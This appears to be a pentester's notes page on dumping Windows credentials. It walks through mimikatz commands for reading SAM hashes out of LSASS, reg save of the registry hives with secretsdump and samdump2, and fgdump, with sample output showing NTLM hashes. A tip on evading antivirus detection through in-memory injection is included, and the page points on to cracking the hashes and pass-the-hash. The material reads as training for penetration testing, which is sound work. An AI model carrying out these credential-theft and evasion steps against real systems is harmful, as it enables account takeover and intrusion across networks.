As already said [^1], SAM database cannot be copied while the operating system is running because the Windows kernel keeps an exclusive file system lock on the file. However, we can use [mimikatz](../Tools/mimikatz.md) to mount in-memory attacks designed to dump the SAM hashes.

[^1]: [Windows Hash](../Dev,%20scripting%20&%20OS/Windows%20Security%20101.md#Windows%20Hash)

>[!tip]
>In the following example, we will run Mimikatz as a standalone application.
>However, due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application. For example, execute Mimikatz directly from memory using an injector [^2] or use a built-in tool like Task Manager to dump the entire LSASS process memory, move the dumped data to a helper machine, and from there, load the data into Mimikatz.

[^2]: [In-memory Injection](../Dev,%20scripting%20&%20OS/Powershell%20for%20pentesters.md#In-memory%20Injection)

Among other things, mimikatz modules facilitate password hash extraction from the Local Security Authority Subsystem (LSASS) process memory where they are cached. Since LSASS is a privileged process running under the SYSTEM user, we must launch mimikatz from an administrative command prompt.

```powershell
C:\> C:\Tools\password_attacks\mimikatz.exe
...
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
740 {0;000003e7} 1 D 33697 NT AUTHORITY\SYSTEM S-1-5-18 (04g,2
1p) Primary
-> Impersonated !
* Process Token : {0;0002e0fe} 1 F 3790250 corp\offsec S-1-5-21-3048852426-32
34707088-723452474-1103 (12g,24p) Primary
* Thread Token : {0;000003e7} 1 D 3843007 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Impersonation (Delegation)
mimikatz # lsadump::sam
Domain : CLIENT251
SysKey : 457154fe3c13064d8ce67ff93a9257cf
Local SID : S-1-5-21-3426091779-1881636637-1944612440
SAMKey : 9b60bd58cdfd663166e8624f20a9a6e5
RID : 000001f4 (500)
User : Administrator
RID : 000001f5 (501)
User : Guest
RID : 000001f7 (503)
User : DefaultAccount
RID : 000001f8 (504)
User : WDAGUtilityAccount
Hash NTLM: 0c509cca8bcd12a26acf0d1e508cb028
RID : 000003e9 (1001)
User : Offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
```

Once having the hash, the next step is trying to [crack it](Password%20Attacks.md#Cracking%20Hashes) or using it to authenticate on other system through [Passing the hash](Password%20Attacks.md#Passing%20the%20hash) techniques.

## Manually dumping SAM

[impacket](../Tools/impacket.md#Dumping%20SAM)

```bash
reg save hklm\sam .\sam
reg save hklm\system .\system
reg save hklm\security .\security

$ secretsdump.py -sam sam -security security -system system LOCAL
```

or alternately [samdump2](https://linux.die.net/man/1/samdump2)

```bash
reg save HKLM\\SAM c:\\SAM  
reg save HKLM\\System c:\\System  
  
$ samdump2 System SAM
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* HelpAssistant:1000:05fa67eaec4d789ec4bd52f48e5a6b28:2733cdb0d8a1fec3f976f3b8ad1deeef:::
*disabled* SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0f7a50dd4b95cec4c1dea566f820f4e7:::
alice:1004:aad3b435b51404eeaad3b435b51404ee:b74242f37e47371aff835a6ebcac4ffe:::
```

## Dumping Password in Active Directory

Since Microsoft’s implementation of Kerberos makes use of single sign-on, password hashes must be stored somewhere in order to renew a TGT request. In current versions of Windows, these hashes are stored in the Local Security Authority Subsystem Service (LSASS) memory space, along with the logged users' tickets.

- [Dumping domain user from LSASS using mimikatz](../Tools/mimikatz.md#Dumping%20domain%20user%20from%20LSASS)
- [Dumping tickets from LSASS using mimikatz](../Tools/mimikatz.md#Dumping%20tickets%20from%20LSASS)

## Dumping Tools

- [mimikatz](../Tools/mimikatz.md)
- [msfconsole (dumping Passwords with kiwi)](../Tools/msfconsole.md#Dumping%20Passwords%20with%20kiwi)
- [msfconsole (dumping Tokens and Creds with incognito)](../Tools/msfconsole.md#Dumping%20Tokens%20and%20Creds%20with%20incognito)
- [Dumping Kerberos Tickets (klist)](../Dev,%20scripting%20&%20OS/Powershell%20for%20pentesters.md#Dumping%20Kerberos%20Tickets%20(klist)) using [Powershell for pentesters](../Dev,%20scripting%20&%20OS/Powershell%20for%20pentesters.md)
- [mimipenguin](https://github.com/huntergregal/mimipenguin)
- Windows Credentials Editor ([wce.exe](https://www.ampliasecurity.com/research/windows-credentials-editor/)) (legacy)
- pwdump.exe (legacy)
- [fgdump.exe](http://foofus.net/goons/fizzgig/fgdump/downloads.htm) (legacy)

```powershell
C:\>FGDUMP.EXE
FGDUMP.EXE
...
No parameters specified, doing a local dump. Specify -? if you are looking for help.
--- Session ID: 2021-02-22-21-27-44 ---
Starting dump on 127.0.0.1

** Beginning local dump **
OS (127.0.0.1): Microsoft Windows XP Professional Service Pack 1 (Build 2600)  
Passwords dumped successfully

-----Summary-----

Failed servers:
NONE

Successful servers:
127.0.0.1

Total failed: 0
Total successful: 1

C:\>type 127.0.0.1.pwdump 
type 127.0.0.1.pwdump
Administrator:500:NO PASSWORD*********************:A8C8B7A37513B7EB9308952B814B522B:::
alice:1004:NO PASSWORD*********************:B74242F37E47371AFF835A6EBCAC4FFE:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
HelpAssistant:1000:05FA67EAEC4D789EC4BD52F48E5A6B28:2733CDB0D8A1FEC3F976F3B8AD1DEEEF:::
SUPPORT_388945a0:1002:NO PASSWORD*********************:0F7A50DD4B95CEC4C1DEA566F820F4E7:::
```